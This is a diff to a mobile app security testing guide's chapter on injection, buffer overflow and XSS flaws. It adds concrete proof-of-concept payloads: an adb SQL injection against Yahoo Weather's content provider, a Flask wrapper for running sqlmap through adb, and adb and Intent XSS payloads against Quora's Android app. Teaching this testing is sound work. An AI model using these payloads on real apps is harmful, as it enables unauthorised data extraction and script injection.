@@ -1,22 +1,22 @@
 ## Testing Code Quality
 
-Mobile app developers use a wide variety of programming languages and frameworks. As such, common vulnerabilities such as SQL injection, buffer overflows, and cross-site scripting (XSS), may manifest in apps when neglecting secure programming practices. 
+Mobile app developers use a wide variety of programming languages and frameworks. As such, common vulnerabilities such as SQL injection, buffer overflows, and cross-site scripting (XSS), may manifest in apps when neglecting secure programming practices.
 
 The same programming flaws may affect both Android and iOS apps to some degree, so we'll provide an overview of the most common vulnerability classes frequently in the general section of the guide. In later sections, we will cover OS-specific instances and exploit mitigation features.
 
 ### Injection Flaws
 
-An *injection flaw* describes a class of security vulnerability occurring when user input is inserted into back-end queries or commands. By injecting meta characters, an attacker can execute malicious code that is inadvertently interpreted as part of the command or query. For example, by manipulating a SQL query, an attacker could retrieve arbitrary database records or manipulate the content of the back-end database.
+An *injection flaw* describes a class of security vulnerability occurring when user input is inserted into back-end queries or commands. By injecting metacharacters, an attacker can execute malicious code that is inadvertently interpreted as part of the command or query. For example, by manipulating a SQL query, an attacker could retrieve arbitrary database records or manipulate the content of the back-end database.
 
 Vulnerabilities of this class are most prevalent in server-side web services. Exploitable instances also exist within mobile apps, but occurrences are less common, plus the attack surface is smaller.
- 
+
 For example, while an app might query a local SQLite database, such databases usually do not store sensitive data (assuming the developer followed basic security practices). This makes SQL injection a non-viable attack vector. Nevertheless, exploitable injection vulnerabilities sometimes occur, meaning proper input validation is a necessary best practice for programmers.
 
 #### SQL Injection
 
 A *SQL injection* attack involves integrating SQL commands into input data, mimicking the syntax of a predefined SQL command. A successful SQL injection attack allows the attacker to read or write to the database and possibly execute administrative commands, depending on the permissions granted by the server.
 
-Apps on both Android and iOS use SQLite databases as a means to control and organize local data storage. Assume an Android app handles local user authentication by storing the user credentials in a local database (a poor programming practice we’ll overlook for the sake of this example). Upon login, the app queries the database to search for a record with the user name and password entered by the user:
+Apps on both Android and iOS use SQLite databases as a means to control and organize local data storage. Assume an Android app handles local user authentication by storing the user credentials in a local database (a poor programming practice we’ll overlook for the sake of this example). Upon login, the app queries the database to search for a record with the username and password entered by the user:
 
 ```java=
 SQLiteDatabase db;
@@ -31,24 +31,67 @@ return c.getCount() != 0;
 Let's further assume an attacker enters the following values into the "username" and "password" fields:
 
 
-```
+```sql
 username = 1' or '1' = '1
 password = 1' or '1' = '1
 ```
 
 This results in the following query:
 
-```
-SELECT * FROM users WHERE username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
+```sql
+SELECT * FROM users WHERE username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
 ```
 
 Because the condition `'1' = '1'` always evaluates as true, this query return all records in the database, causing the login function to return "true" even though no valid user account was entered.
+
+Ostorlab exploited the sort parameter of Yahoo's weather mobile application with adb using this SQL injection payload.
+
+```
+$ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort '_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=1\)'  
+
+Row: 0 _id=1, woeid=2487956, isCurrentLocation=0, latitude=NULL, longitude=NULL, photoWoeid=NULL, city=NULL, state=NULL, stateAbbr=, country=NULL, countryAbbr=, timeZoneId=NULL, timeZoneAbbr=NULL, lastUpdatedTimeMillis=746034814, crc=1591594725
+
+```
+
+The payload can be further simplified using the following `_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master\)`.
+
+This SQL injection vulnerability did not expose any sensitive data that the user didn't already have access to. This example presents a way that adb can be used to test vulnerable content providers. Ostorlab takes this even further and creates a webpage instance of the SQLite query, then runs SQLmap to dump the tables.
+
+```python
+
+import subprocess
+from flask import Flask, request
+
+app = Flask(__name__)
+
+URI = "com.yahoo.mobile.client.android.weather.provider.Weather/locations/"
+
+@app.route("/")
+def hello():
+
+   method = request.values['method']
+   sort = request.values['sort']
+   sort = "_id/**/limit/**/(SELECT/**/1/**/FROM/**/sqlite_master/**/WHERE/**/1={})".format(sort)
+   #sort = "_id/**/limit/**/({})".format(sort)
+
+   p = subprocess.Popen(["adb","shell","content",method,"--uri","content://{}".format(URI),"--sort",'"{}"'.format(sort)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+
+   o, e = p.communicate()
+
+   print "[*]SORT:{}".format(sort)
+   print "[*]OUTPUT:{}".format(o)
+   return "<html><divclass='output'>{}</div></html>".format(o)
+
+if __name__=="__main__":
+   app.run()
+
+```
 
 One real-world instance of client-side SQL injection was discovered by Mark Woods within the "Qnotes" and "Qget" Android apps running on QNAP NAS storage appliances. These apps exported content providers vulnerable to SQL injection, allowing an attacker to retrieve the credentials for the NAS device. A detailed description of this issue can be found on the [Nettitude Blog](http://blog.nettitude.com/uk/qnap-android-dont-provide "Nettitude Blog - QNAP Android: Don't Over Provide").
 
 #### XML Injection
 
-In an *XML injection* attack, the attacker injects XML meta characters to structurally alter XML content. This can be used to either compromise the logic of an XML-based application or service, as well as possibly allow an attacker to exploit the operation of the XML parser processing the content.
+In a *XML injection* attack, the attacker injects XML metacharacters to structurally alter XML content. This can be used to either compromise the logic of an XML-based application or service, as well as possibly allow an attacker to exploit the operation of the XML parser processing the content.
 
 A popular variant of this attack is [XML Entity Injection (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing). Here, an attacker injects an external entity definition containing an URI into the input XML. During parsing, the XML parser expands the attacker-defined entity by accessing the resource specified by the URI. The integrity of the parsing application ultimately determines capabilities afforded to the attacker, where the malicious user could do any (or all) of the following: access local files, trigger HTTP requests to arbitrary hosts and ports, launch a [cross-site request forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) attack, and cause a denial-of-service condition. The OWASP web testing guide contains the [following example for XXE](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)):
 
@@ -65,7 +108,7 @@ The current trend in app development focuses mostly on REST/JSON-based services 
 
 #### Injection Attack Vectors
 
-The attack surface of mobile apps is quite different from typical web and network applications. Mobile apps don't often expose services on the network, and viable attack vectors on an app's user interface are rare. Injection attacks against an app are most likely to occur through inter-process communication (IPC) interfaces, where a malicious app attacks another app running on the device. 
+The attack surface of mobile apps is quite different from typical web and network applications. Mobile apps don't often expose services on the network, and viable attack vectors on an app's user interface are rare. Injection attacks against an app are most likely to occur through inter-process communication (IPC) interfaces, where a malicious app attacks another app running on the device.
 
 Locating a potential vulnerability begins by either:
 
@@ -83,7 +126,7 @@ During a manual security review, you should employ a combination of both techniq
 
 Verify that the following best practices have been followed:
 
-- Untrusted inputs are type-checked and/or validated using a white-list of acceptable values. 
+- Untrusted inputs are type-checked and/or validated using a white-list of acceptable values.
 - Prepared statements with variable binding (i.e. parameterized queries) are used when performing database queries. If prepared statements are defined, user-supplied data and SQL code are automatically separated.
 - When parsing XML data, ensure the parser application is configured to reject resolution of external entities in order to prevent XXE attack.
 
@@ -123,7 +166,6 @@ The following code snippet shows a simple example for a condition resulting in a
 To identify potential buffer overflows, look for uses of unsafe string functions (`strcpy`, `strcat`, other functions beginning with the “str” prefix, etc.) and potentially vulnerable programming constructs, such as copying user input into a limited-size buffer. The following should be considered red flags for unsafe string functions:
 
     - `strcat`
-    - `strlcat`
     - `strcpy`
     - `strncat`
     - `strlcat`
@@ -172,12 +214,42 @@ XSS issues may exist if the URL opened by WebView is partially determined by use
 ```java
 webView.loadUrl("javascript:initialize(" + myNumber + ");");
 ```
+Another example of XSS issues determined by user input is public overriden methods.
+
+```java
+@Override
+public boolean shouldOverrideUrlLoading(WebView view, String url) {
+  if (url.substring(0,6).equalsIgnoreCase("yourscheme:")) {
+    // parse the URL object and execute functions
+  }
+}
+```
+
+Sergey Bobrov was able to take advantage of this in the following [HackerOne report](https://hackerone.com/reports/189793). Any input to the html parameter would be trusted in Quora's ActionBarContentActivity. Payloads were successful using adb, clipboarddata via ModalContentActivity, and Intents from 3rd party applications.
+
+- ADB
+```bash
+adb shell
+am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
+```
+- Clipboard Data
+```bash
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+```
+- 3rd party Intent
+```java
+Intent i = new Intent();
+i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
+i.putExtra("url","http://test/test");
+i.putExtra("html","XSS PoC <script>alert(123)</script>");
+startActivity(i);
+```
 
 If WebView is used to display a remote website, the burden of escaping HTML shifts to the server side. If an XSS flaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to perform static analysis of the web application source code.
 
 Verify that the following best practices have been followed:
 
-- No untrusted data is rendered in HTML, JavaScript or other interpreted contexts unless it is absolutely necessary. 
+- No untrusted data is rendered in HTML, JavaScript or other interpreted contexts unless it is absolutely necessary.
 
 - Appropriate encoding is applied to escape characters, such as HTML entity encoding. Note: escaping rules become complicated when HTML is nested within other code, for example, rendering a URL located inside a JavaScript block.
 
@@ -185,12 +257,12 @@ Consider how data will be rendered in a response. For example, if data is render
 
 | Character  | Escaped      |
 | :-------------: |:-------------:|
-| & | &amp;amp;| 
-| < | &amp;lt; | 
-| > | &amp;gt;| 
-| " | &amp;quot;| 
-| ' | &amp;#x27;| 
-| / | &amp;#x2F;| 
+| & | &amp;amp;|
+| < | &amp;lt; |
+| > | &amp;gt;|
+| " | &amp;quot;|
+| ' | &amp;#x27;|
+| / | &amp;#x2F;|
 
 
 For a comprehensive list of escaping rules and other prevention measures, refer to the [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet "OWASP XSS Prevention Cheat Sheet").
@@ -215,3 +287,10 @@ A [reflected XSS attack](https://www.owasp.org/index.php/Testing_for_Reflected_C
 
 - CWE-20 - Improper Input Validation
 
+#### XSS via start ContentActivity
+
+- https://hackerone.com/reports/189793
+
+#### Android, SQL and ContentProviders or Why SQL injections aren't dead yet ?
+
+- http://blog.ostorlab.co/2016/03/android-sql-and-contentproviders-or-why.html
